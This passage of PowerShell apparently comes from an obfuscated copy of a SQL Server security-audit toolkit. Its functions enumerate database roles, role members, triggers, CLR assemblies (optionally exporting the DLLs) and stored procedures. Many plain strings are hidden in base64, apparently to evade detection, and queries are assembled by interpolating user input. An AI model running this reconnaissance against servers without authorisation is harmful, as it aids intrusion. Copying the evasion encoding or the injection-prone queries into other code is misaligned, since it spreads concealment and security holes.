            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting roles from the $DbName database."
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                principal_id as [RolePrincipalId],
                sid as [RolePrincipalSid],
                name as [RolePrincipalName],
                type_desc as [RolePrincipalType],
                owning_principal_id as [OwnerPrincipalId],
                suser_name(owning_principal_id) as [OwnerPrincipalName],
                is_fixed_role,
                create_date,
                modify_Date,
                default_schema_name
                FROM [$DbName].[sys].[database_principals]
                WHERE type like 'R'
                $RolePrincipalNameFilter
            $RoleOwnerFilter"
            $TblDatabaseRolesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblDatabaseRolesTemp |
            % -Process {
                $NewSid = [System.BitConverter]::ToString($_.RolePrincipalSid).Replace('-','')
                if ($NewSid.length -le 10)
                {
                    $Sid = [Convert]::ToInt32($NewSid,16)
                }
                else
                {
                    $Sid = $NewSid
                }
                $null = $TblDatabaseRoles.Rows.Add(
                    [string]$_.ComputerName,
                    [string]$_.Instance,
                    [string]$_.DatabaseName,
                    [string]$_.RolePrincipalId,
                    $Sid,
                    $_.RolePrincipalName,
                    [string]$_.RolePrincipalType,
                    [string]$_.OwnerPrincipalId,
                    [string]$_.OwnerPrincipalName,
                    [string]$_.is_fixed_role,
                    $_.create_date,
                    $_.modify_Date,
                [string]$_.default_schema_name)
            }
        }
    }
    End
    {
        $TblDatabaseRoles
    }
}
Function  Get-SQLDatabaseRoleMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Role name.')]
        [string]$RolePrincipalName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL login or Windows account name.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDatabaseRoleMembers = New-Object -TypeName System.Data.DataTable
        if ($PrincipalName)
        {
            $PrincipalNameFilter = " AND USER_NAME(member_principal_id) like '$PrincipalName'"
        }
        else
        {
            $PrincipalNameFilter = ''
        }
        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND USER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting role members for the $DbName database..."
            }
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                role_principal_id as [RolePrincipalId],
                USER_NAME(role_principal_id) as [RolePrincipalName],
                member_principal_id as [PrincipalId],
                USER_NAME(member_principal_id) as [PrincipalName]
                FROM [$DbName].[sys].[database_role_members]
                WHERE 1=1
                $RolePrincipalNameFilter
            $PrincipalNameFilter"
            $TblDatabaseRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblDatabaseRoleMembers = $TblDatabaseRoleMembers + $TblDatabaseRoleMembersTemp
        }
    }
    End
    {
        $TblDatabaseRoleMembers
    }
}
Function  Get-SQLTriggerDdl
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDdlTriggers = New-Object -TypeName System.Data.DataTable
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = " SELECT 	'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            name as [TriggerName],
            object_id as [TriggerId],
            [TriggerType] = 'SERVER',
            type_desc as [ObjectType],
            parent_class_desc as [ObjectClass],
            OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
            create_date,
            modify_date,
            is_ms_shipped,
            is_disabled
            FROM [master].[sys].[server_triggers] WHERE 1=1
        $TriggerNameFilter"
        $TblDdlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp
    }
    End
    {
        $TblDdlTriggers
    }
}
Function  Get-SQLTriggerDml
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblDmlTriggers = New-Object -TypeName System.Data.DataTable
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing DML triggers from the databases below:."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                name as [TriggerName],
                object_id as [TriggerId],
                [TriggerType] = 'DATABASE',
                type_desc as [ObjectType],
                parent_class_desc as [ObjectClass],
                OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                create_date,
                modify_date,
                is_ms_shipped,
                is_disabled,
                is_not_for_replication,
                is_instead_of_trigger
                FROM [$DbName].[sys].[triggers] WHERE 1=1
                $TriggerNameFilter"
            $TblDmlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblDmlTriggers = $TblDmlTriggers + $TblDmlTriggersTemp
        }
    }
    End
    {
        $TblDmlTriggers
    }
}
Function  Get-SQLStoredProcedureCLR
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for filenames.')]
        [string]$AssemblyName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Folder to export DLLs to.')]
        [string]$ExportFolder,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Do not show database users associated with default databases.')]
        [Switch]$NoDefaults,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Show native CLR as well.')]
        [Switch]$ShowAll,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblAssemblyFiles = New-Object -TypeName System.Data.DataTable
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAZQBtAGEAXwBuAGEAbQBlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAGkAZAA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBpAGwAZQBfAG4AYQBtAGUA'))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBsAHIAXwBuAGEAbQBlAA=='))))   
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AaQBkAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbgBhAG0AZQA=')))) 
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AYwBsAGEAcwBzAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBzAHMAZQBtAGIAbAB5AF8AbQBlAHQAaABvAGQA'))))    
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AbwBiAGoAZQBjAHQAXwBpAGQA')))) 
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AbgBhAG0AZQA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AdAB5AHAAZQA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABlAHIAbQBpAHMAcwBpAG8AbgBfAHMAZQB0AF8AZABlAHMAYwA='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAGUAYQB0AGUAXwBkAGEAdABlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBvAGQAaQBmAHkAXwBkAGEAdABlAA=='))))
        $null = $TblAssemblyFiles.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAG4AdABlAG4AdAA='))))
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose  -NoDefaults
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }
        if($AssemblyName){
            $AssemblyNameQuery = "WHERE af.name LIKE '%$AssemblyName%'"
        }else{
            $AssemblyNameQuery = ""
        }
        $Counter = 0
        $TblDatabases |
        % -Process {
            $DbName = $_.DatabaseName
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Searching for CLR stored procedures in $DbName"
            }
            $Query = "  USE $DbName;
                        SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], 
			                        af.file_id,					  	
			                        af.name + '.dll' as [file_name],
			                        asmbly.clr_name,
			                        asmbly.assembly_id,           
			                        asmbly.name AS [assembly_name], 
                                    am.assembly_class,
                                    am.assembly_method,
			                        so.object_id as [sp_object_id],
			                        so.name AS [sp_name],
                                    so.[type] as [sp_type],
                                    asmbly.permission_set_desc,
                                    asmbly.create_date,
                                    asmbly.modify_date,
                                    af.content								           
                        FROM        sys.assembly_modules am
                        INNER JOIN  sys.assemblies asmbly
                        ON  asmbly.assembly_id = am.assembly_id
                        INNER JOIN sys.assembly_files af 
                        ON asmbly.assembly_id = af.assembly_id 
                        INNER JOIN  sys.objects so
                        ON  so.[object_id] = am.[object_id]
                        $AssemblyNameQuery"
                    $NativeStuff = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFUATgBJAE8ATgAgAEEATABMAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUATABFAEMAVAAgACAAIAAgACAAIABTAEMASABFAE0AQQBfAE4AQQBNAEUAKABhAHQALgBbAHMAYwBoAGUAbQBhAF8AaQBkAF0AKQAgAEEAUwAgAFsAUwBjAGgAZQBtAGEATgBhAG0AZQBdACwAIAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AZgBpAGwAZQBfAGkAZAAsAAkACQAJAAkACQAgACAACQANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBmAC4AbgBhAG0AZQAgACsAIAAnAC4AZABsAGwAJwAgAGEAcwAgAFsAZgBpAGwAZQBfAG4AYQBtAGUAXQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAGMAbAByAF8AbgBhAG0AZQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHMAbQBiAGwAeQAuAG4AYQBtAGUAIABBAFMAIABbAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQB0AC4AYQBzAHMAZQBtAGIAbAB5AF8AYwBsAGEAcwBzACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AVQBMAEwAIABBAFMAIABbAGEAcwBzAGUAbQBiAGwAeQBfAG0AZQB0AGgAbwBkAF0ALAANAAoACQAJAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgBVAEwATAAgAGEAcwAgAFsAcwBwAF8AbwBiAGoAZQBjAHQAXwBpAGQAXQAsAA0ACgAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAHQALgBuAGEAbQBlACAAQQBTACAAWwBzAHAAXwBuAGEAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJwBVAEQAVAAnACAAQQBTACAAWwB0AHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYQBzAG0AYgBsAHkALgBwAGUAcgBtAGkAcwBzAGkAbwBuAF8AcwBlAHQAXwBkAGUAcwBjACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AYwByAGUAYQB0AGUAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAcwBtAGIAbAB5AC4AbQBvAGQAaQBmAHkAXwBkAGEAdABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAZgAuAGMAbwBuAHQAZQBuAHQACQAJAAkACQAJAAkACQAJACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgACAAIAAgACAAIAAgACAAcwB5AHMALgBhAHMAcwBlAG0AYgBsAHkAXwB0AHkAcABlAHMAIABhAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEkATgBOAEUAUgAgAEoATwBJAE4AIAAgAHMAeQBzAC4AYQBzAHMAZQBtAGIAbABpAGUAcwAgAGEAcwBtAGIAbAB5ACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGEAcwBtAGIAbAB5AC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAAPQAgAGEAdAAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBOAE4ARQBSACAASgBPAEkATgAgAHMAeQBzAC4AYQBzAHMAZQBtAGIAbAB5AF8AZgBpAGwAZQBzACAAYQBmACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGEAcwBtAGIAbAB5AC4AYQBzAHMAZQBtAGIAbAB5AF8AaQBkACAAPQAgAGEAZgAuAGEAcwBzAGUAbQBiAGwAeQBfAGkAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBSAEQARQBSACAAQgBZACAAIAAgACAAWwBhAHMAcwBlAG0AYgBsAHkAXwBuAGEAbQBlAF0ALAAgAFsAYQBzAHMAZQBtAGIAbAB5AF8AbQBlAHQAaABvAGQAXQAsACAAWwBzAHAAXwBuAGEAbQBlAF0A')))
            if($ShowAll){
                $Query = "$Query$NativeStuff"
            }
            $TblAssemblyFilesTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $TblAssemblyFilesTemp |
            % -Process {
                $null = $TblAssemblyFiles.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]$DbName,
                    [string]$_.schema_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.assembly_class,
                    [string]$_.assembly_method,
                    [string]$_.sp_object_id,
                    [string]$_.sp_name,
                    [string]$_.sp_type,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.content)
                $CLRFilename = $_.file_name
                $CLRMethod = $_.assembly_method
                $CLRAssembly = $_.assembly_name
                $CLRAssemblyClass = $_.assembly_class
                $CLRSp = $_.sp_name   
                Write-Verbose "$instance : - File:$CLRFilename Assembly:$CLRAssembly Class:$CLRAssemblyClass Method:$CLRMethod Proc:$CLRSp"                             
                if($ExportFolder){
                    $ExportOutputFolder = "$ExportFolder\CLRExports"
                    If ((test-path $ExportOutputFolder) -eq $False){
                        Write-Verbose "$instance :   Creating export folder: $ExportOutputFolder"
                        $null = ni -Path "$ExportOutputFolder" -type directory
                    }  
                    $InstanceClean = $Instance -replace('\\','_')
                    $ServerPath = "$ExportOutputFolder\$InstanceClean"
                    If ((test-path $Serverpath) -eq $False){
                        Write-Verbose "$instance :   Creating server folder: $ServerPath"
                        $null = ni -Path "$ServerPath" -type directory
                    }                   
                    $Databasepath = "$ServerPath\$DbName"
                    If ((test-path $Databasepath) -eq $False){
                        Write-Verbose "$instance :   Creating database folder: $Databasepath"
                        $null = ni $Databasepath -type directory
                    } 
                    $FullExportPath = "$Databasepath\$CLRFilename"
                    if(-not (Test-Path $FullExportPath)){
                        Write-Verbose "$Instance :   Exporting $CLRFilename"                        
                        $_.content | sc -Encoding Byte $FullExportPath
                    }else{
                        Write-Verbose "$Instance :   Exporting $CLRFilename - Aborted, file exists."  
                    }
                    $Counter = $Counter + 1                    
                }                     
            }
        }
    }
    End
    {
        $CLRCount = $TblAssemblyFiles.Rows.Count
        if ($CLRCount -gt 0){
            Write-Verbose "$Instance : Found $CLRCount CLR stored procedures"
        }else{
            Write-Verbose "$Instance : No CLR stored procedures found."    
        }
        $TblAssemblyFiles
    }
}
Function  Get-SQLStoredProcedure
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblProcs = New-Object -TypeName System.Data.DataTable
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }
        if ($AutoExec)
        {
            $AutoExecFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABBAE4ARAAgAGkAcwBfAGEAdQB0AG8AXwBlAHgAZQBjAHUAdABlAGQAIAA9ACAAMQA=')))
        }
        else
        {
            $AutoExecFilter = ''
        }
    }
    Process
    {
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        if($NoDefaults)
        {
